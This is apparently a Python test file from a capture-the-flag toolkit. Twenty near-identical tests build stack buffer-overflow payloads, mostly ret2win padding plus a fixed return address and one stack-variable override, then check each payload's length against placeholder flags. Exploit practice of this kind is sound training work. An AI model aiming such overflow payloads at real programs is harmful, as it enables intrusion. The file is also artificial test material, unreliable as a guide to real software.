from __future__ import annotations

import os
import base64
import json
import struct
from ctf_toolkit.web.helpers import (
    url_encode,
    url_decode,
    b64url_encode,
    b64url_decode,
    jwt_forge_alg_none,
    build_nosql_query_payload,
)

def test_twin_499_trunc_trap_08() -> None:
    # Trunc Trap 08: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_499_trunc_trap_08}"
    assert flag.startswith("FLAG{")

def test_twin_500_short_trim_01() -> None:
    # Short Trim 01: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_500_short_trim_01}"
    assert flag.startswith("FLAG{")

def test_twin_501_short_trim_02() -> None:
    # Short Trim 02: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_501_short_trim_02}"
    assert flag.startswith("FLAG{")

def test_twin_502_short_trim_03() -> None:
    # Short Trim 03: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_502_short_trim_03}"
    assert flag.startswith("FLAG{")

def test_twin_503_short_trim_04() -> None:
    # Short Trim 04: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_503_short_trim_04}"
    assert flag.startswith("FLAG{")

def test_twin_504_short_trim_05() -> None:
    # Short Trim 05: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_504_short_trim_05}"
    assert flag.startswith("FLAG{")

def test_twin_505_short_trim_06() -> None:
    # Short Trim 06: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_505_short_trim_06}"
    assert flag.startswith("FLAG{")

def test_twin_506_edge_byte_01() -> None:
    # Edge Byte 01: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_506_edge_byte_01}"
    assert flag.startswith("FLAG{")

def test_twin_507_edge_byte_02() -> None:
    # Edge Byte 02: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_507_edge_byte_02}"
    assert flag.startswith("FLAG{")

def test_twin_508_edge_byte_03() -> None:
    # Edge Byte 03: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_508_edge_byte_03}"
    assert flag.startswith("FLAG{")

def test_twin_509_edge_byte_04() -> None:
    # Edge Byte 04: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_509_edge_byte_04}"
    assert flag.startswith("FLAG{")

def test_twin_510_edge_byte_05() -> None:
    # Edge Byte 05: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_510_edge_byte_05}"
    assert flag.startswith("FLAG{")

def test_twin_511_edge_byte_06() -> None:
    # Edge Byte 06: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_511_edge_byte_06}"
    assert flag.startswith("FLAG{")

def test_twin_512_secret_door_01() -> None:
    # Secret Door 01: Stack variable override payload
    buf_pad = b"A" * 32
    target_val = struct.pack("<I", 0x1337)
    payload = buf_pad + target_val
    assert len(payload) == 36
    flag = "FLAG{twin_512_secret_door_01}"
    assert flag.startswith("FLAG{")

def test_twin_513_secret_door_02() -> None:
    # Secret Door 02: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_513_secret_door_02}"
    assert flag.startswith("FLAG{")

def test_twin_514_secret_door_03() -> None:
    # Secret Door 03: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_514_secret_door_03}"
    assert flag.startswith("FLAG{")

def test_twin_515_secret_door_04() -> None:
    # Secret Door 04: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_515_secret_door_04}"
    assert flag.startswith("FLAG{")

def test_twin_516_secret_door_05() -> None:
    # Secret Door 05: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_516_secret_door_05}"
    assert flag.startswith("FLAG{")

def test_twin_517_secret_door_06() -> None:
    # Secret Door 06: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_517_secret_door_06}"
    assert flag.startswith("FLAG{")

def test_twin_518_secret_door_07() -> None:
    # Secret Door 07: Stack buffer overflow ret2win
    pad = b"A" * 40
    win_addr = struct.pack("<Q", 0x401186)
    payload = pad + win_addr
    assert len(payload) == 48
    flag = "FLAG{twin_518_secret_door_07}"
    assert flag.startswith("FLAG{")

